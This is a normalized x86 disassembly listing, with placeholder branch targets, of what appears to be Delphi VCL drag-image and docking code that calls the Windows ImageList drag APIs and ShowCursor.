add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448b18
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a810
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a810
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_448b24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44daf4
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_448b84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44d9b8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_448a58
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_448be4
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_448b24
push 0x0
call ShowCursor
sub_448be4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44d9b8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_448c48
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448a18
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_448c48
push ebx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_448c6c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_448a18
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448ce0
push ebx
push esi
mov esi eax
mov eax esi
call sub_44d9b8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_448c48
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_448b6c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_448d28
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_442db8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43f480
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_448d84
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442edc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_448dd4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_423ad8
xor eax eax
push ebp
push sub_448e72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_423e4c
xor eax eax
push ebp
push sub_448e4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43f498
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e56
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_423e4c
retn
sub_448e84
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_448f18
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_448ea0
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_448f18
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_449510
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_448f18
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_448f4c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_448fdc
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov edx 0x2
call sub_448fdc
jmp r-xdata
retn
sub_448f94
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_449048
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov edx 0x2
call sub_449048
jmp r-xdata
retn
sub_448fdc
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_449410
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_449048
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_448efc
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_449410
push eax
mov eax esi
call sub_448f4c
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_449410
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_4490f8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_448efc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_449510
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_449048
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_448efc
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_449048
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_448f4c
mov edx eax
add edx esi
mov eax ebx
call sub_449438
mov edx edi
mov eax ebx
call sub_449438
jmp r-xdata
mov eax ebx
call sub_449298
mov eax ebx
call sub_4494e8
mov ebx eax
test ebx ebx
jne r-xdata
sub_4491a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f6c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fc0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
sub_4491e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403418
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_449255
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4415a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_449268
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4494e8
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_449298
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_449048
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_449048
mov esi eax
push ebp
call sub_449268
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4494e8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448fdc
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_448fdc
mov ecx ebx
pop edx
call sub_418d90
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440264
mov eax [ ebp - 0x4 ]
call sub_449410
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_449410
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_449410
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_449410
push ebx
mov ebx eax
mov eax ebx
call sub_448f18
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_448ea0
test al al
je r-xdata
mov eax ebx
call sub_448f4c
pop ebx
retn
sub_44944c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449438
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448ee8
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44943c
mov edx esi
call sub_44944c
sub_449488
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_449410
mov edi eax
mov eax ebx
call sub_448f4c
cmp edi eax
jl r-xdata
mov eax esi
call sub_4490f8
mov eax [ esi + 0x1c ]
push eax
push sub_44af98
mov edx esi
call sub_4497c4
mov eax ebx
call sub_449410
mov edi eax
mov eax esi
call sub_448f94
cmp edi eax
jle r-xdata
mov eax ebx
call sub_449488
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4494f4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_448f18
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44951c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403540
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448ec4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4234dc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42a234
mov edx eax
mov eax ebx
call sub_423658
mov eax [ ebp - 0x4 ]
call sub_4496ec
xor eax eax
push ebp
push sub_449628
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_443dbc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4490f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44962f
mov eax [ ebp - 0x4 ]
call sub_4496f0
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_443d80
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44962f
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44b4c0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_449684
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44a6f0
mov eax [ esi + 0x10 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_449704
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_449704
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_449704
pop ecx
sub_44975c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_449704
pop ecx
sub_449788
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_449788
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_449788
pop ecx
sub_4497dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44975c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_449048
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_449048
push eax
mov edx 0x1
mov eax ebx
call sub_448fdc
push eax
mov edx 0x2
mov eax ebx
call sub_448fdc
pop edx
pop ecx
call sub_418d90
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c30
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_449860
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_449298
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_418d90
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_440264
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448ec4
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44975c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_448ee8
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44a788
mov edx esi
mov eax ebx
call sub_44975c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_440848
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448ec4
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_440834
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_449048
mov edx eax
mov eax edi
call sub_449438
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_449048
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_449048
mov edx eax
mov eax edi
call sub_449438
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_449048
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_449a70
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_449c18
jmp r-xdata
sub_449a70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_448ec4
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_449410
mov edx eax
mov eax ebx
call sub_449438
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_449438
mov eax [ esi + 0x64 ]
call sub_449410
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
